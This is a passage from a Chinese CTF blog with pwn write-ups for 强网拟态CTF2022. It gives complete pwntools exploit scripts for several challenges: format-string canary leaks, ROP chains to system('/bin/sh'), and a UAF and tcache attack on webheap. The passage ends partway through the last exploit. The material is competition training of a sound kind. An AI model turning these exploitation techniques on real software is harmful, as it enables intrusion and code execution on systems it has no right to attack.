<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>本题目没有做出来，比赛时没有时间做了，赛后复现找不到 wp 也很头痛</p>
<p>cpp 的堆环境很乱，并且逆向出来也很难看，暂时没有找到漏洞点，但通过遗留在 unsorted chunk 中的 main_arena 指针，和遗留在 tcache chunk 中的 next 指针，可以完成泄露</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">touch(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">touch(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">mkdir(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">echo(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;p&quot;</span>*<span class="number">0x780</span>)</span><br><span class="line">echo(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>)</span><br><span class="line">cat(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ed063</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">echo(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x11</span>)</span><br><span class="line">cat(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x12a63</span> </span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<p>但程序只要执行过一次 <code>echo</code> 后（必须成功写入数据），再次执行 <code>touch</code> 和 <code>mkdir</code> 都会报错</p>
<p>暂时只能完成泄露了，找不到漏洞点</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/13/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81CTF2022/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/13/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81CTF2022/" class="post-title-link" itemprop="url">强网拟态CTF2022</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-13 17:50:51" itemprop="dateCreated datePublished" datetime="2022-11-13T17:50:51+08:00">2022-11-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-19 18:00:58" itemprop="dateModified" datetime="2022-12-19T18:00:58+08:00">2022-12-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>25k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>23 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="pwn1-pwn1-1-pwn2-1"><a href="#pwn1-pwn1-1-pwn2-1" class="headerlink" title="pwn1 ~ pwn1-1 ~ pwn2-1"></a>pwn1 ~ pwn1-1 ~ pwn2-1</h2><p>这3个题比较简单，就直接放 exp 了：</p>
<p><strong>pwn1</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.145&#x27;</span>, <span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b* \n&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0xB19)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;You will find some tricks\n&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">proc_base = leak_addr - <span class="number">0xA94</span></span><br><span class="line">system = <span class="number">0xA2C</span> + proc_base</span><br><span class="line">binsh = <span class="number">0x202068</span> + proc_base</span><br><span class="line">pop_rdi = <span class="number">0x0000000000000c73</span> + proc_base</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;proc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">&quot;%33$p&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;hello\n&quot;</span>)</span><br><span class="line">canary = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">success(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">200</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>pwn1-1</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1-1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.131&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b* \n&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x153C)\nb *$rebase(0x1423)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;You will find some tricks\n&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">proc_base = leak_addr - <span class="number">0x12a0</span></span><br><span class="line">system = <span class="number">0x11A2</span> + proc_base</span><br><span class="line">binsh = <span class="number">0x4050</span>+ proc_base</span><br><span class="line">pop_rdi = <span class="number">0x0000000000001943</span> + proc_base</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;proc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span>*(<span class="number">0xd0</span>) + p64(proc_base + <span class="number">0x4060</span> )</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>-<span class="number">1</span>,<span class="string">&quot;a&quot;</span>)+p64(proc_base + <span class="number">0x4060</span>)*<span class="number">4</span>+ p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>pwn2-1</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn2-1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.20&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1B0A)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">ch</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Note size :&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content :&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice :let us give you some tips\n&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">pro_base = leak_addr - <span class="number">0x11f0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">catflag = <span class="number">0x1B70</span>+pro_base</span><br><span class="line">chunk_list = <span class="number">0x40A0</span>+pro_base</span><br><span class="line">success(<span class="string">&quot;chunk_list &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(chunk_list))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,p64(catflag))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="webheap"><a href="#webheap" class="headerlink" title="webheap"></a>webheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.4</span>)</span> stable release version 2.27.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webheap: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">27</span>dde4c970e713a66d152d11040e93cccb362625, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>cpp 反序列化 -&gt; python 序列化</strong></p>
<p>程序实现了反序列化读入</p>
<ul>
<li>内存里存的数据不通用，不同系统不同语言的组织可能都是不一样的</li>
<li>序列化的二进制数据是通过一定的协议将数据字段进行拼接<ul>
<li>第一个优势是：不同的语言都可以遵循这种协议进行解析，实现了跨语言</li>
<li>第二个优势是：这种数据可以直接持久化到磁盘，从磁盘读取后也可以通过这个协议解析出来</li>
</ul>
</li>
</ul>
<p>如果要想使用网络框架的 API 来传输结构化的数据，必须得先实现 [结构化的数据] 与 [字节流] 之间的双向转换，这种将结构化数据转换成字节流的过程，称为序列化，反过来转换，就是反序列化</p>
<p>本题目用 cpp 来实现反序列化，难点就在逆向的过程，要在一堆很难看的 cpp 代码中找到“编码格式”（目标地址为“0x45A8”）</p>
<ul>
<li>我对于 cpp 的逆向不是很熟悉，但在比赛的过程中也收获了一些 cpp 的逆向技巧（之后总结一下）</li>
<li>以后有机会写一个反序列化的 cpp 程序，然后拖 IDA 分析一下</li>
</ul>
<p>这种题目的关键就在于：根据反序列化的代码，来推导实现序列化的 python 脚本</p>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">dele</span><span class="params">(<span class="keyword">unsigned</span> __int64 index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)chunk_list[index]);              <span class="comment">// UAF</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>有 UAF</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>当逆向工作完成之后，可以根据程序的反序列化过程，写出序列化的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setuint</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x&gt;=<span class="number">0</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7f</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x80</span>)+p8(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x80</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x81</span>)+p16(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x8000</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x82</span>)+p32(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x80000000</span> <span class="keyword">and</span> x&lt;=<span class="number">0x7fffffffffffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x83</span>)+p64(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setint</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="number">0</span> <span class="keyword">and</span> x &lt;= <span class="number">0xff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x84</span>)+p8(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x100</span> <span class="keyword">and</span> x&lt;=<span class="number">0xffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x85</span>)+p16(x)</span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">0x10000</span> <span class="keyword">and</span> x&lt;=<span class="number">0xffffffff</span>:</span><br><span class="line">        <span class="keyword">return</span> p8(<span class="number">0x86</span>)+p32(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_code</span>(<span class="params">op, idx, size, num1,num2</span>):</span></span><br><span class="line">    payload = p8(<span class="number">0xb9</span>) + p8(<span class="number">0x05</span>)</span><br><span class="line">    payload += setint(op) + setuint(idx) +setuint(size) + <span class="string">&#x27;\xBD&#x27;</span>+setuint(num1)+p8(<span class="number">0</span>)+setuint(num2)</span><br><span class="line">    sla(<span class="string">&#x27;Packet length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    sa(<span class="string">&#x27;Content:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">0</span>,idx,size,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">1</span>,idx,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> send_code(<span class="number">2</span>,idx,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    payload = p8(<span class="number">0xb9</span>) + p8(<span class="number">0x05</span>)</span><br><span class="line">    payload += p8(<span class="number">3</span>) +p8(idx) + p8(<span class="number">0x30</span>) + <span class="string">&#x27;\xBD&#x27;</span>+p8(<span class="number">6</span>)+p64(cont)</span><br><span class="line">    sla(<span class="string">&#x27;Packet length: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    sa(<span class="string">&#x27;Content:&#x27;</span>, payload)</span><br></pre></td></tr></table></figure>
<p>利用 UAF 完成泄露以后，就打 tcache attack，尝试申请 <code>free_hook</code>，然后修改为 <code>system</code> 就可以了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 